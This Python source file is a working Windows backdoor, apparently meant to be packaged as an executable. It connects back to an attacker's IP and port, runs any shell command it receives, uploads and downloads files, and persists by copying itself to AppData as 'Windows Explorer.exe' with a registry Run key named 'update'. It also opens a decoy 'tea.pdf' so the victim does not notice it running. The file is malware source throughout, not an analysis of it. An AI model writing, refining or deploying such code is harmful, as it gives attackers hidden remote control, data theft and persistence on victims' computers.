#!/usr/bin/env python
import socket, errno
import subprocess
import base64
import shutil
import json
import sys
import os

from util import parse_args


class BackdoorException(Exception):
    pass


class Backdoor:

    def __init__(self, ip, port):

        if not ip or ip is None:
            raise BackdoorException
        else:
            self.ip = ip

        if not port or port is None:
            raise BackdoorException
        else:
            self.port = port

        self.buffer_size = 1024
        self.connection = None
        self.connect()

    def connect(self):
        self.persist()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))

    @staticmethod
    def persist():
        # print(f'[debug] {" ".join(dir(os.environ.keys()))}')
        evil_file_location = f'{str(os.environ["appdata"])}\\Windows Explorer.exe'
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "{evil_file_location}"', shell=True)

    def upgrade_shell(self):
        """
        TODO
        https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
        https://docs.python.org/3/library/pty.html
        http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

        TODO: Icons
        http://www.iconarchive.com/commercialfree.4.html
        """
        pass

    def transmit(self, data):
        transmission = json.dumps(data).encode()
        return self.connection.send(transmission)

    def receive(self):
        transmission = ''
        while True:
            try:
                transmission = self.connection.recv(self.buffer_size)
                return json.loads(transmission)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode()
        except subprocess.CalledProcessError:
            self.transmit(f'[!] Failed to execute system command: {command}.')

    @staticmethod
    def change_working_directory(path):
        os.chdir(path)
        return f'[+] Changing current directory to {str(path)}'

    @staticmethod
    def read_file(path):
        with open(path, 'rb') as f:
            return base64.b64encode(f.read())

    @staticmethod
    def write_file(path, contents):
        with open(path, 'wb') as f:
            f.write(base64.b64decode(contents))
            return f'[+] Success - downloaded {str(path)}'

    def run(self):

        while True:
            result = None
            syscommand = self.receive()
            try:
                if syscommand[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif syscommand[0] == 'cd' and len(syscommand) > 1:
                    result = self.change_working_directory(syscommand[1])
                elif syscommand[0] == 'download' and len(syscommand) > 1:
                    result = self.read_file(syscommand[1])
                elif syscommand[0] == 'upload' and len(syscommand) > 1:
                    result = self.write_file(syscommand[1], syscommand[2])
                else:
                    result = self.execute_system_command(syscommand)

            except BackdoorException as err:
                result = err

            if result is not None:
                self.transmit(result)


if __name__ == '__main__':
    file_name = f'{sys._MEIPASS}\\tea.pdf'
    subprocess.Popen(file_name, shell=True)
    args = parse_args()
    try:
        listener = Backdoor(args.ip, args.port)
        listener.run()
    except (BackdoorException, KeyboardInterrupt):
        sys.exit()
